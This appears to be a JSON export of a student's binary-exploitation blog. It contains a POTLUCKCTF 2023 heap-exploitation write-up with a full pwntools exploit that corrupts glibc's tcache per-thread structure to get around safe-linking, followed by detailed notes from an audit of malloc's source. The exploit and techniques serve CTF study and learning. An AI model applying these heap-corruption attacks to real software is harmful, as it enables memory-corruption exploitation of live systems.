{"BINARY-EXPLOITATION":{"title":"BINARY-EXPLOITATION","links":["STACK-BASED-EXPLOITATION","LEARNING-NOTES/MALLOC-SRC-CODE-AUDIT","KERNEL-EXPLOITATION"],"tags":["blog"],"content":"This is the documentation of my journey into binary exploitation and computer science as a whole, not having done anything related to computer science until my college first year, I am starting blind, wish me luck.\nCurrently playing CTF’s with the team bi0s.\n1 year later : Still a newbie but I think Im starting to get somewhere.\nEntrypoint 1 : STACK-BASED-EXPLOITATION\nEntrypoint 2 : MALLOC SRC CODE AUDIT\nEntrypoint 3 : KERNEL EXPLOITATION"},"CTF-WRITEUPS/POTLUCKCTF-2023":{"title":"POTLUCKCTF-2023 TAMAGOYAKI","links":["tags/heap_exploitation","tags/writeups"],"tags":["blog","heap-exploitation","ctf-writeups","heap_exploitation","writeups"],"content":"heap_exploitationwriteups\n\nTAMAGOYAKI &lt;&lt; POTLUCK CTF 2023\nCODE REVIEW -\nThe code has the following functions\n\ndinner()\n\n\nChecks if a byte sequence exist in an mmapped region which we do not know the location of, If it exists it prints out the flag.\n\n\ndo_malloc()\n\n\nCalls malloc where we control what size is allocated and which offset to that we write to\n\n\ndo_free()\n\n\nCalls free where we control what pointer is freed, and no pointers are nulled out i.e we can free more than once any pointer that we choose.\n\nDuring the setup stage a function prep() is called which mmaps at a random offset and puts the flag there and checks if a write was made to the location. The function after that puts the address in an 0x18 malloc chunk which would be the first chunk in the heap after the tcache per thread struct.\nCHALLENGE SUMMARY\nTo get to the mmapped region and mark the offset with the following 0x37C3C7F byte sequence which will write out the flag when you call the function dinner.\nThe challenge here requires you to do the following without getting any leaks for the mmapped region or without leaking any heap pointers to arrive at that place and write the bytes in the offset.\nThis would have been quite simple without safelinking in place as we could go for the following approach\n\nfill up tcache\nsomehow make a tcache point to the 0x21 chunk using partial overwrites on the heap pointers.\nAllocate tcache twice to get the mmaped location as the chunk.\nNoice\nBut that is not the case, thus we have to find some way to get around safe-linking here. The only way I think it is possible is somehow making the protect_ptr function encrypt and decrypt a custom pointer that we provide but not mess up tcache internally.\n\nOBSERVATIONS THAT COULD HELP US &gt;&gt;\n\nTcache pointers dont get nulled out when the chunk is returned to the user\nWhen one tcache chunk is added onto the list it does an ENCRYPT_PTR of the current top of tcache and adds it to the list\nWithin the tcache_perthread struct the ptrs are saved as normal pointers.\nDuring allocation from tcache the head of the tcache list is placed after doing REVEAL_PTR on the pointer.\nThe tcache perthread struct is present within the heap itself\n\nCORRUPTING THE TCACHE PER-THREAD-STRUCTURE\nThe following idea is similar to that of HOUSE OF IO which I discovered afterwards.\nIf we construct a 0x290 chunk and make the tcache fd pointer to zero, the tcache struct itself would get linked onto tcache freelist. Which would be very useful for any other exploit strategy as we would end up corrupting the whole tcache, similar to forging a whole arena which controls allocations. But here we are lacking functions that could leak values which thus results in this strategy being almost useless as we dont know what addresses to write. But since we have an offset control we can corrupt the pointers here instead to cause the tcache to redirect the chunk to the 0x21 chunk. But from there it is hard to see the future as the pointer is not encrypted, The REVEAL_PTR function will just segfault as it tries to access invalid memory.\nThis strategy only requires the following &gt;&gt;\n\nBeing able to allocate a chunk of size 0x290\nGetting a UAF in tcache to wipe of the tcache key and null out the pointer\n\nWe have both of these conditions so the first step is taken care of, but how do we encrypt the pointer that we don’t know the address of or do we have to encrypt it in the first place ?\nCURRENT EXPLOIT STRATEGY &gt;&gt;\n\nallocate an 0x290 tcache chunk.\nUsing overlapping chunks / some other primitive wipe out the tcache cookie and null out the tcache pointer.\nAllocate another 0x290 chunk, this would occupy the tcache_perthread_structure.\nmodify addresses placed in the structure through partial overwrites and repeatedly freeing the addresses and changing offsets\nMake one of the addresses point to the 0x21 chunk which will then be occupied while its pointer gets DECRYPTED and ends up in the tcache perthread structure\nMake another tcache struct address point to a fake location which is occupied by the pointer which was present in the 0x21 chunk, Allocate a chunk of that size but dont write anything this time.\nThis would result in the unmangled version of the pointer ending up in one of the tcache struct entries.\nAllocate a chunk of that size and write the value 0x37C37F\nMuney\n\nOne challenge we are going to face is the lack of coalescing tcache has which in turn means if we want to get overlapping chunks we must fill tcache\nANOTHER WAY TO CORRUPT A TCACHE PTR ⇒\nCorrupt small bin through a partial overwrite after which it directly corrupts tcache if you try making it fill up correctly. The smallbin pointers are not mangled thus causing us to be able to write to its bytes with a chance of 1/16 success.\nNEW METHOD &gt;&gt;\nWhen corrupting smallbins you can place an intermediate ptr just before a chunk which malloc would not check if you have a UAF on a smallbin\nNORMALLY &gt;&gt;\n[BK][BIN][FD]-&gt;&gt;-[BK][C1][FD]-&gt;&gt;-[BK][C2][FD]-|\n  |___________________&lt;&lt;______________________|\n\nThis would be the normal linked list in which we corrupt the bk of the second chunk\n[BK][BIN][FD]-&gt;&gt;-[BK][C1][FD]-&gt;&gt;-[BK][FAKE][FD]--&gt;&gt;--[BK][C2][FD]-|\n  |___________________&lt;&lt;_________________&lt;&lt;_______________________|\n\nUnlike normal chunks the only restriction for this chunk is that it should point back to the c1 chunk.\nThis would mean that the fake chunk ends up in tcache during tcache small-bin stashing even if it doesnt meet normal chunk criterias. Giving us an arbitrary write given right conditions. This also does not corrupt the smallbin as a bonus thus making it possible to get an allocation through tcache as the bk pointer will be fixed. \nThis can also be used to write an abritrarily large value somewhere in memory.\nI would have to see into it more but I do assume it should work.\n\nSo using the following method you can corrupt the tcache perthread struct which then allows you to edit the pointers in the structure thus giving you almost complete control over heap allocations.\nSTRATEGY TO CORRUPT THE TCACHE PERTHREAD STRUCTURE -\n\nGain first allocation on the struct\n\nplace pointer to make bk of smallbin point back to valid smallbin chunk\nGet an intermediate smallbin chunk to point to the pointer at the struct\nPull of the tcache diversion attack\nGet an allocation in the struct by allocating two more chunks\n\n\n\nAfter this you can pull of the previous strategy we discussed to get a tcache chunk to point to the mmapped location and an allocation of that bin size will lead you to get the chunk and the allocation in the region where you can write the value to get the flag.\nfrom pwn import *\n \nexe = &#039;./Tamagoyaki_patched&#039;\n \n(host,port_num) = (&quot;localhost&quot;,1337)\n \ndef start(argv=[], *a, **kw):\n    if args.GDB:\n        return gdb.debug(\n            [exe] + argv, gdbscript=gscpt, *a, **kw)\n    elif args.RE:\n        return remote(host,port_num)\n    else:\n        return process( \n            [exe] + argv, *a, **kw)\n    \ngscpt = (\n    &#039;&#039;&#039;\nb * main\n&#039;&#039;&#039;\n).format(**locals())\n \ncontext.update(arch=&#039;amd64&#039;)\n \n# SHORTHANDS FOR FNCS\nse  = lambda nbytes     : p.send(nbytes)\nsl  = lambda nbytes     : p.sendline(nbytes)\nsa  = lambda msg,nbytes : p.sendafter(msg,nbytes)\nsla = lambda msg,nbytes : p.sendlineafter(msg,nbytes)\nrv  = lambda nbytes     : p.recv(nbytes)\nrvu = lambda msg        : p.recvuntil(msg)\nrvl = lambda            : p.recvline()\n \ndef w(*args):\n    print(f&quot;〔\\033[1;32m&gt;\\033[0m〕&quot;,end=&quot;&quot;)\n    for i in args:\n        print(hex(i)) if(type(i) == int) else print(i,end=&quot; &quot;)\n    print(&quot;&quot;)\n \ncontext.log_level = \\\n    &#039;DEBUG&#039;\n \n# _____________________________________________________ #\n# &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; EXPLOIT STARTS HERE &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; #\n \nfreed = []\ndictt = {}\nindex = 0x0\n \ndef malloc(size,data,name,offset=0):\n    global index\n    sla(b&quot;&gt; &quot;,b&quot;1&quot;)\n    sla(b&quot;size: &quot;,str(size).encode())\n    sla(b&quot;offset: &quot;,str(offset).encode())\n    sa(b&quot;buffer: &quot;,data)\n    dictt[name] = index\n    index += 1\n \ndef free(name):\n    sla(b&quot;&gt; &quot;,b&quot;2&quot;)\n    sla(b&quot;idx: &quot;,str(dictt[name]).encode())\n \ndef gimme_dinner():\n    sla(b&quot;&gt; &quot;,b&quot;3&quot;)\n \ncontext.aslr = False\n \np = start()\n \n# WE CAN ALLOCATE A TOTAL OF 128 CHUNKS\n \n# IDK COULD BE USEFUL\nmalloc(0x18,b&quot;S1&quot;,&quot;v1&quot;)\n \n# FILLING UP AN 0X70 TCACHE AND THEN PLACING POINTERS \n# AT PLACES USING FASTBINS\nfor i in range (9):\n    malloc(0x70,b&quot;sugu&quot;,f&quot;s{i}&quot;)\n \nfor i in range (9):\n    free(f&quot;s{i}&quot;)\n \n# CAUSING A MALLOC CONSOLIDATE CALL TO COALESCE FASTBINS\nfake_chnk = p64(0x0) + p64(0x291) + 0x288*b&quot;a&quot; + p64(0x191)\nmalloc(0x490,fake_chnk,&quot;c1&quot;,offset=0x70)\n \n# FILLING UP TCACHE CHUNKS OF SIZE-RANGE\nfor i in range (8):\n    malloc(0x288,b&quot;sugu&quot;,f&quot;tfill{i}&quot;)\n \nmalloc(0x18,b&quot;FENCEPOST&quot;,f&quot;post1&quot;)\n \n# FILL UP THE TCACHE FOR THE SIZE 0X291\nfor i in range (7):\n    free(f&quot;tfill{i}&quot;)\n \n# CURRENT GOAL IS TO PLACE A POINTER IN TCACHE_PER_THREAD STRUCTURE\n# PLACING PTRS USING MALLOC CONSOLIDATE\nfor i in range (9):\n    malloc(0x70,b&quot;sugu&quot;,f&quot;r{i}&quot;)\n \nfor i in range (9):\n    free(f&quot;r{i}&quot;)\n \n# CRAFTING THE CHUNK TO PUT A TCACHE CHUNK PTR\nfake_chnk = p64(0x0) + p64(0x551) + 0x548*b&quot;a&quot; + p64(0x61)\nmalloc(0x600,fake_chnk,&quot;POP&quot;,offset=0x70)\n \nmalloc(0x18,b&quot;FENCEPOST&quot;,&quot;post2&quot;)\nmalloc(0x420,b&quot;CLAYCHUNK&quot;,&quot;SF1&quot;)\nmalloc(0x18,b&quot;FENCEPOST&quot;,&quot;post3&quot;)\n \n# FREEING FAKE CHUNK\nfree(&quot;SF1&quot;)\nmalloc(0x1b0,&quot;TEMPCHUNK&quot;,&quot;tmp1&quot;)\n \nfree(&quot;r8&quot;)\nmalloc(0x2d8,&quot;TEMPCHUNK&quot;,&quot;tmp1&quot;)\n \n# SHUFFLING UNSORTED BIN\nmalloc(0x500,b&quot;SHUFFLE&quot;,&quot;shuf&quot;)\nfree(&quot;shuf&quot;)\n \n# PUTTING THE TCACHE PTR IN PLACE BY ALLOCATING TO SMALLBIN\n# AND USING THE SMALLBIN STASHING PROCEDURE\nmalloc(0x268,&quot;OCCUPY&quot;,&quot;t280&quot;)\n \nfree(&quot;POP&quot;)\nfake_chnk = p64(0x0) + p64(0x581) + 0x578*b&quot;a&quot; + p64(0x31)\nmalloc(0x600,fake_chnk,&quot;POP2&quot;,offset=0x70)\n \nfree(&quot;tfill7&quot;)\n \nfree(&quot;s8&quot;)\n \nfree(&quot;r8&quot;)\nmalloc(0x2e8,&quot;TEMPCHUNK&quot;,&quot;tmp2&quot;)\n \n# SHUFFLING UNSORTED BIN\nmalloc(0x500,b&quot;SHUFFLE&quot;,&quot;shuf2&quot;)\nfree(&quot;shuf2&quot;)\n \n# USING TCACHE ALLOCATIONS\nfor i in range (7):\n    malloc(0x288,&quot;FILLER&quot;,f&quot;W{i}&quot;)\n \n# DOING A SMALLBIN STASH BY REQUESTING SMALLBIN SIZE\nfree(&quot;c1&quot;)\nfake_chnk = b&quot;\\xa0\\xa1&quot;\nmalloc(0x490,fake_chnk,&quot;c1.1&quot;,offset=0x88)\n \nmalloc(0x288,&quot;CHUNK1&quot;,&quot;CH0&quot;)\nmalloc(0x288,&quot;CHUNK2&quot;,&quot;P2&quot;)\n \n# WRITING A SIZE FIELD TO GET A PERSISTENT ALLOCATION IN THE CHUNK\npayload = p64(0x1a1)\nmalloc(0x288,payload,&quot;Q1&quot;,offset=0x28)\n \nmalloc(0x288,&quot;CHUNK3&quot;,&quot;CH1&quot;)\n \n# GOING HAM ALL OVER AGAIN\nfor i in range (7):\n    free(f&quot;W{i}&quot;)\n \n# CORRUPTING TCACHE 0X2d0 TO SET POINTERS\nfree(&quot;POP2&quot;)\nfake_chnk = p64(0x0) + p64(0x581) + 0x578*b&quot;a&quot; + p64(0x41)\nmalloc(0x600,fake_chnk,&quot;POP3&quot;,offset=0x70)\n \nfree(&quot;r8&quot;)\nmalloc(0x2a1,&quot;SOMETHING&quot;,&quot;tmp2&quot;)\n \nmalloc(0x2c8,&quot;LOWPTR&quot;,&quot;LOWPTR&quot;)\n \nfree(&quot;LOWPTR&quot;)\n \nfree(&quot;POP3&quot;)\nfake_chnk = p64(0x0) + p64(0x581) + 0x578*b&quot;a&quot; + p64(0x31)\nmalloc(0x600,fake_chnk,&quot;POP4&quot;,offset=0x70)\n \nfree(&quot;r8&quot;)\n \nmalloc(0x2b8,&quot;TEMPCHUNK&quot;,&quot;tmp2&quot;)\nmalloc(0x2b8,&quot;REQUIREDPTR&quot;,&quot;CH2&quot;)\n \nfree(&quot;POP4&quot;)\nfake_chnk = p64(0x291) + 0x288*b&quot;a&quot; + p64(0x41)\nmalloc(0x600,fake_chnk,&quot;POP5&quot;,offset=0x338)\n \nfree(&quot;CH0&quot;)\nfree(&quot;CH1&quot;)\nfree(&quot;CH2&quot;)\n \n# SHUFFLING UNSORTED BIN\nmalloc(0x500,b&quot;SHUFFLE&quot;,&quot;shuf3&quot;)\nfree(&quot;shuf3&quot;)\n \nfree(&quot;c1&quot;)\nfake_chnk = b&quot;\\xd0\\xa1&quot;\nmalloc(0x490,fake_chnk,&quot;c1.1&quot;,offset=0x88)\n \n# USING TCACHE ALLOCATIONS\nfor i in range (7):\n    malloc(0x288,&quot;FIRSTALLOC&quot;,f&quot;W{i}&quot;)\n \nmalloc(0x288,&quot;FINALE1&quot;,&quot;F1&quot;)\nmalloc(0x288,&quot;FINALE1&quot;,&quot;F1&quot;)\n \npayload = p64(0x2f0)\nmalloc(0x288,payload,&quot;W&quot;,offset=0xb8)\nmalloc(0x2f0,&quot;WIN2&quot;,&quot;L&quot;)\nfree(&quot;L&quot;)\nmalloc(0x310,&quot;WIN2&quot;,&quot;L&quot;)\nmalloc(0x310,&quot;WIN2&quot;,&quot;L0&quot;)\nfree(&quot;L&quot;)\nfree(&quot;L0&quot;)\n \nfree(&quot;W&quot;)\npayload = b&quot;\\xa0\\xa2&quot;\nmalloc(0x198,payload,&quot;W.0&quot;,offset=0x20)\n \nmalloc(0x2f0,&quot;WIN3&quot;,&quot;L&quot;)\n \nfree(&quot;W.0&quot;)\npayload = b&quot;\\x00\\xa2&quot;\nmalloc(0x198,payload,&quot;W.1&quot;,offset=0x30)\n \npayload = p64(0x37c3c7f)\nmalloc(0x310,&quot;FINAL&quot;,&quot;W&quot;,offset=0x0)\nmalloc(0x310,payload,&quot;W&quot;,offset=0x0)\n \ngimme_dinner()\n \np.interactive()"},"KERNEL-EXPLOITATION":{"title":"KERNEL EXPLOITATION","links":[],"tags":["kernel-exploitation"],"content":"This is where I would update my Kernel exploitation notes after I am through some of it."},"LEARNING-NOTES/HEAP-EXPLOITATION":{"title":"HEAP EXPLOITATION","links":["LEARNING-NOTES/MALLOC-SRC-CODE-AUDIT","UNSAFE-UNLINK"],"tags":["blog","heap-exploitation","learning"],"content":"These are my heap exploitation notes :)\nPREVIOUS  &gt;&gt; MALLOC SRC CODE AUDIT\nNEXT          &gt;&gt;  UNSAFE-UNLINK\nThis is the beginning of my documentation of the heap exploitation challenges I will solve and techniques that I will learn. I shall update the following once I sort through them.\nUntil then\nR0R1"},"LEARNING-NOTES/MALLOC-SRC-CODE-AUDIT":{"title":"MALLOC SRC CODE AUDIT","links":["MALLOC-LABS"],"tags":["blog","heap-exploitation","learning"],"content":"PREVIOUS &gt;&gt; MALLOC LABS\nTHIS IS A SOURCE CODE AUDIT OF MALLOC.C FROM  [GLIBC 3.8.9000]\n\nI did the following audit a while back in october last year\nI am putting out the following as I had went through glibc source code to learn heap exploitation\nHopefuly it is of use even though the newer glibc just dropped\n\nALLOCATION SIZES AND METHODS —\n\nrequests of sizes --&gt;\n- &gt;=  512 bytes - best-fit allocation FIFO \n- &lt;=   64 bytes - first fit caching LIFO?\n- &gt;= 128K bytes - system memory mapping facilities --mmap\n\nALIGNMENT - 2 * sizeof(size_t)\n\tEven a request for zero bytes (i.e., malloc(0)) returns a\n\tpointer to something of the minimum allocatable size.\n\nwastage is less than or equal to minsize usually but during mmap, allocation made is in the order of two pages.\n\nValues that appear to be negative after overhead and alignment are supported by only mmap. On failure of the following returns NULL.\n\nMALLOC_DEBUG DMALLOC_DEBUG and stuff can be used to run malloc while it checks across the size fields of the following.\n\nTCACHE_MAX_BINS     -     64\nTCACHE_FILL_COUNT   - no of chunks held by a bin - usually 7 max - 65535 UINT16\nidx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)\nidx 1   bytes 25..40 or 13..20\nidx 2   bytes 41..56 or 21..28\n...\n\nREALLOC_ZERO_BYTES_FREES - controls if realloc(0) calls free [1 - default]\nTRIM_FASTBINS            - controls if to trim fastbins for reducing memory footprint and avoiding usage of system level emmory [0 - default] \n\nM_MXFAST - Fastbin sizes range from 0 to 80 where 0 would disable it resulting in best-fit for all cases. set by the macro [64 - default]\nM_TRIM_THRESHOLD - [32*0x1000] can be set to -1 to disable it. Chooses when to trim the heap by checking this value.\nM_TOP_PAD        - [0] amount of padding/free space to retain while giving a call to sbrk\nM_MMAP_THRESHOLD - [32*0x1000] has MIN AND MAX VALUES MIN HAS FOLLOWING WHILE MAX HAS 128 * 0X1000\nM_MMAP_MAX       - 65536\n\n\nLIBC FUNCTIONS FOR MEMORY MANAGEMENT :\n[__libc_malloc]  (size_t)         - allocating memory\n[__libc_free  ]  (void *)         - freeing up memory once used\n[__libc_calloc]  (size_t,size_t)  - allocating and 0-ing memory\n[__libc_realloc] (void *,size_t)  - reallocating memory\n[__libc_memalign](size_t,size_t)  - aligning memory to size_t\n[__libc_valloc]  (size_t)         - system mem allocation\n[__libc_mallocinfo]               - gets info related to malloc\n[__libc_pvalloc] (size_t)         - allocate sys-mem pagealigned\n[__malloc_trim]  (size_t)         - gives mem back to system\n \nMORECORE\n\nUsed to obtain memory from the OS through sbrk\n\nMORECORE            - type usually sbrk\nMORECORE_FAILURE    - defines if morecore failed\nMORECORE_CONTIGUOUS - defines if allocation is contiguous\nMORECORE_CLEARS     - defines 0ing out of memory\nHAVE_MREMAP         - allows the remapping of blocks\n\nSTRUCTURE OF CHUNK:\nmalloc chunk{\nsize_t prev_size\nsize_t chunk_size\n \n// used when only free -- all blocks\nchunk * fd;    \nchunk * bk;\n \n// used in only large blocks and if free\nchunk * fd_nextsize \nchunk * bk_nextsize\n}\nEXCEPTIONS TO THE MALLOC CHUNK RULES --\n- Top chunk does not use the trailing size field as it does not have any data beyond it\n- If the mmapped bit is set then the other bits are ignored as the mmapped memory do not belong in an arena or are never adjacent to a freed chunk\n- Fastbin chunks are consolidated only in bulk in malloc_consolidate else they are considered as allocated\n\nMEMORY TAGGING\nThe malloc functions which has a prefix __int_ to it are used to deal with untagged memory.\nIMPORTANT STRUCTURES THAT MANAGE MEMORY\nBINS :\nBins is the version of a segregated linked list in malloc which is in size-ordered fashion. There are in total 128 bins whose inner sizes are logarithmically spaced. Bins work in a FIFO approach.\nThe following is the way the bins are split\n64 bins of size        8\n32 bins of size        64\n16 bins of size       512\n 8 bins of size      4096\n 4 bins of size     32768\n 2 bins of size    262144\n 1 bin  of size  what&#039;s left\n\nUNSORTED BINS :\nUnsorted chunks are stored at the bin 1 which is usually un-indexable. It acts like a queue where chunks are placed on it due to free and malloc_consolidate and taken off during calls to malloc i.e placed in proper bins or to be used. NON_MAIN_ARENA flag is never set in these chunks.\nTOP CHUNK:\nTop chunk is the top most available chunk which is never included in any bin and is only used if no other chunk is available. Memory here can be released back to the system if above M_TRIM_THRESHOLD. Top points to its own bin with initial size as 0. This is to avoid any special case checking for the top chunk every time any function is being called. The following also helps top to treat the bin as legal but unusable during the time between initialisation and first call to sysmalloc. During first call initial_top is defined as one of the unsorted_chunks.\nBINMAP:\nBinmap is a one-level index structure [a bit vector] used for bin-by-bin searching. It records if the bins are not empty so that they can be skipped during traversals. The bits are marked only when they are noticed during malloc traversal.\nFASTBINS:\nSegregated free list holding recently freed small chunks\n\nworks on LIFO\nSingly linked lists\nOrdering doesnt matter\nInuse bit is set and thus only consolidates during malloc_consolidate\n\ndefault MAX_FAST_SIZE 180/0XA0 BYTES\nFASTBIN_CONSOLIDATION_THRESHOLD 65535 - size of a chunk in free that triggers auto-consolidation of nearby fastbin chunks. \nNON_CONTIGOUS_BIT used when MORECORE returns memory which are not contigous regions. The initial value is false as MORECORE_CONTIGOUS is set to true.\nhave_fastchunks indicate the presence of fastbin chunks, set to NULL during calls to malloc_consolidate().\n\nmax_fast can be changed which can even be set to very small values for disabling fastbins. The max memory handled in fastbins is defined by this global variable.\nPrecondition: there is no existing fastbin chunks in the main arena.\nSince do_check_malloc_state () checks this, it calls malloc_consolidate () before changing max_fast.  Note other arenas will leak their fast bin\nentries if max_fast is reduced.\nIMPORTANT BITS:\nPREV_INUSE  - LOWEST BIT INDICATES IF PREVIOUS IS FREE OR IN USE\nIS_MMAPPED  - SECOND LOWEST &gt; FOR CHECKING IF BLOCK WAS MMAPPED\nNON_MAIN_AR - THIRD LOWEST UNUSED WHEN NO NEW THREADS ARE THERE\n\nOTHER STRUCTURES USED:\n\n\nmalloc_state\n\n\nMalloced states are placed in mmapped areas which are part of arenas. It has the state of malloc and dynamic memory allocations within the current arena.\nmstates are operated on by the following functions:\nstatic void *sysmalloc (INTERNAL_SIZE_T,mstate);\nstatic int   systrim (size_t,mstate);\nstatic void malloc_consolidate (mstate);\nstatic void tcache_thread_shutdown (void);\n\n\nmalloc_par\n\n\nThis is used for storing important parameters such as trim_threshold, top_pad, mmap_threshold, arena_test, arena_max etc.  Keeping track of mmapped memory and number of mmaps. sbrk_base. If tcache is enabled then the following parameters are specified within, no of tcache bins, no of chunks in each bucket, number of chunks to remove from bucket.\nMITIGATIONS :-\n\n\n\n\nSAFE LINKING\nTo protect the single-linked list of Fast-Bins and T-Cache and double linked list of Small-Bins from getting pointer hijacked, Masking is done to the “next” pointers of the lists in the chunks using the randomness from ASLR/(mmap_base). In short a simple xor with the upper bytes of the memory page the current requested chunk lies in i.e\n[pointer ^ ptr &gt;&gt; 12]\ndemasking code —\n\n\n\n\nworks when the pointer points to the memory lying within the same page\n\n\thex((encoded ^ (encoded &gt;&gt; 12) ^ (encoded &gt;&gt; 24)) ^ (encoded &gt;&gt; 36))\n\n\n\nMEMORY TAGGING\nThe pointers alongside the blocks are coloured and they are recoloured when they are freed and given back. This is used to detect buffer overflows and use-after-frees. This has a performance impact but the old ptr’s are ensured to not be used due to this. usually DISABLED. But can be enabled in systems such as ARM.\n\n\n\n\nDOUBLE FREE DETECTION\nThe tcache entry has a key field in the backward pointer to detect double frees. The backward pointer is set to this specific key value which then prevents it from being overwrittten and freed again.\n\n\n\nDEBUG-MODE MALLOC FUNCTIONS:\ndo_check_chunk (mstate av,mchunkptr p)\n\nChecks if the chunk is in a valid address if it is contigous\nChecks if top size is at least MINSIZE\nChecks if top predecessor is always marked inuse\nChecks if top size is always greater than MINSIZE\nIF MMAPPED\nchecks if chunk is page aligned\nchecks if chunk is mem aligned\n\ndo_check_free_chunk (mstate av, mchunkptr p)\n\nCalls do_check_chunk()\nChecks if chunk is free and chunk is not mmapped\nChecks if chunk remains coalesced if any\nChecks if it has proper links\n\ndo_check_inuse_chunk (mstate av, mchunkptr p)\n\nCalls do_check_chunk()\nChecks if chunk is mmapped if yes it returns\nelse it checks if the chunk claims to be inuse\nchecks if next chunk claims to be prev inuse if not it checks for a free chunk by calling do_check_free_chunk()\nChecks topchunk by calling do_check_free_chunk on top\n\ndo_check_remalloced_chunk (mstate av, mchunkptr p,INTERNAL_SIZE_T s)\n\nChecks if chunk is mmapped if not checks if arena is same as obtained\nCalls do_check_inuse_chunk()\nChecks if the size is valid alongside alignment\nChecks if chunk is less than minsize or more than requested size “s”\nAll of these results in a fail\n\ndo_check_malloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)\n\nCalls do_check_remalloced_chunk()\nPrev inuse is true for every allocated chunk\n\ndo_check_malloced_state (mstate av)\n\nChecks if INTERNAL_SIZE_T is only as small as pointer type\nChecks if alignment is a power of two\nChecks if the arena is initialised i.e top!=0 if yes it returns\nELSE checks the consistency of the main_arena with the sbrk base\n+\nFASTBIN CHECKS\nCheck if max_fast is only in the allowed range\nChecks if all bins past max_fast are empty\nChecks if all fastbin chunks claim to be inuse and is aligned\nChecks if the chunk belongs to the respective bin\n+\nNORMBIN CHECKS\nChecks if the binmap is correct\nChecks if the chunks in the bin are free\nChecks if chunk belongs in the bin\nChecks if the lists are sorted\nChecks if the chunk lists are proper.\nCheck the top chunk again by calling check_chunk()\nCheck if the induvidual chunks are followed by a chain of inuse chunks\n\nSPECIFIC FUNCTION SUMMARIES\n\nUnlink_chunk -\nUnlinks a chunk from the bin list.\nlist of checks —\n\nchecks if the prev_size of next chunk is same as the chunksize else returns corrupted size vs. prev size\nchecks if the forward pointer of the previous is same as the backward pointer of the next field, else marks corrupted double-linked list.\nChecks if the pointer is small by checking fd_nextsize and bk_nextsize\n\nget_max_fast() -\nchecks if the global variable max_fast is greater than MAX_FAST_SIZE macro and if yes it calls an error else it returns global_max_fast. This is to prevent out of bound memory access in an array form.\nSYSTEM ALLOCATION ROUTINES:\n\nSysmalloc_mmap (INTERNAL_SIZE_T nb,size_t pagesize,int extra_flags,mstate av)\nCalls mmap on behalf of malloc with the specified size nb and flags\nreturns if the call to mmap fails and assumes av→top doesnt have enough space to service the request.\nlist of checks —\n\nChecks if the mmap size value wraps around zero, if yes the call fails\nOther things it does —\nIf flags are lacking for a very large allocation advises kernel using madvice() which calls madvise() with advise as HUGE_PAGE\nCalls mmap and sets the header and footer with the aligned size field always aligns it despite no chances of page-aligned memory not being aligned.\nUpdates n_mmaps and max_mmapped_memoryCalls check_chunk()\nreturns pointer to mmapped memory\n\nSysmalloc_mmap_fallback (long int *s,INTERNAL_SIZE_T nb, INTERNAL_SIZE_T old_size,size_t minsize, size_t pagesize, int extra_flags,mstate av)\nUsed as a fallback if MORECORE fails to provide enough memory.\nlist of checks —\n\nChecks if the mmap size value wraps around zero, if yes the call fails\nOther things that this does —\nSets as noncontigous in the arena so as to mark the region as not part of the original heap so as to not rely on regions being contigous\n\nsysmalloc (INTERNAL_SIZE_T nb ,mstate av)\nThe call has a precondition that it is only called if the top has lesser space than what is required.\nlist of checks —\n\nChecks if the current top has the prev_inuse set and if its aligned alongside having at least MINSIZE value.\nIt does the following functions —\n\n\nDirect call to mmap if the size meets mmap_threshold and mmap is there and av == NULL, i.e no arena\n\n\nif the mmap call fails then it returns 0 else av is set to the new mmaped region.\n\n\nif av != main_arena this means that memory cant be obtained using sbrk so\n-⇒ Tries to grow current heap by trying to mprotect memory\n-⇒ if failed tries to allocate new heap\n-⇒ if failed calls mmap using sysmalloc_mmap() if tried is not set\n-⇒ if failed returns idk cause if MAP_FAILED it considers av as main arena and goes to the else block. .. wierd maybe it just returns…\nIf av== main_arena Page aligns the size and calls MORECORE which gets memory from OS through sbrk.\n-⇒ if MORECORE fails then sysmalloc_mmap_fallback() is used\n-⇒ if failed sets brk as MAP_FAILED and snd_brk as brk+size\nIf previous routine doesnt fail then extends top and sets head\nIt checks if there was an intervening sbrk call and if there was it calls sbrk with a correction amount which ends at a page boundary. This is what happens when the memory is contigous. If not contigous the sbrk call is made with argument 0 which will help to set up footers and move to another chunk.\nWhen sbrk is checked if a gap is present between the previous sbrk call and top chunk then it sets it as correction and artificial chunks are created around it which are set to always inuse. These are described as fenceposts in the source. When setting up such fenceposts the old top can completely be overwritten due to it, if in case it was of size → MINSIZE. If there is remaining size after setting up the fenceposts it is freed and added to the unsorted bins.\nAfter all of the following is done the function checks if at least one of the following paths succeed setting the size. This returns the pointer p which would be our allocated memory address.\nIf failed it sets the error and returns zero.\n\nSystrim(size_t pad,mstate av)\nIt does the following\n\nIt checks for foreign sbrk calls and returns 0 if a external call was made\nIt page aligns pad and subtracts that amount from the top chunk and also unmaps by calling sbrk with -ve value of the amount.\nIt checks if the released amount is not 0, it returns 1 after adjusting top by subtracting released amount and sets head and calls check_malloc_state()\n\nmunmap_chunk(mchunkptr p)\nThe following is what the function does\n\nIt makes sure the given ptr is a mmapped ptr : bit 2 is set and that the ptr is a multiple of pagesize and 2\nIf yes it unmaps the pointer if it fails the program simply returns claiming nothing much can be done.\n\nmremap_chunk(mchunkptr p, size_t new_size)\ncalls mremap if the newsize versus total size has an increase  or decrease in number of pages. if failed returns 0,\n→ checks alignment\n→ checks prev field on if it is set to true always\n→ sets header with the required offset subtracted from it\n→ returns the pointer p when it succeeds\n\nTCACHE FUNCTIONS :\nTCACHE ENTRY STRUCTURE\n\nstruct tcache_entry {\n\nstruct tcache_entry *next;\n\n// key to prevent double frees\nuintptr_t key;\n\n}\n\nTcache backward pointer will have a specific key value of 64 bits which is placed to denote that the chunk has been freed once. This is used against bugs such as double-frees().\n\nThere is a tcache_perthread_struct which has the number of bins and pointer to the entries and the structure is a global variable within libc\nTcache key that exists are initialised by the tcache_key_initialisefunction\n\n\nThe caller should verify if everything’s good when calling tcache_put\n\n\ntcache_put - sets the key to be the tcache_key - which is a global variable and protects the pointer and puts it in updating the tcache index.\ntcache_get_n -  checks if a chunk is aligned and returns the following chunk after unlinking it from the tcache list, same is with tcache_get but it instead removes from front.\ntcache_next iterates through the list\ntcache_shutdown Shuts down tcache and frees all the lists held by tcaching for coalescing after an alignment check.\ntcache_init - It does not work when tcache_shutting_down variable is set.\n\nLIBC FUNCTIONS 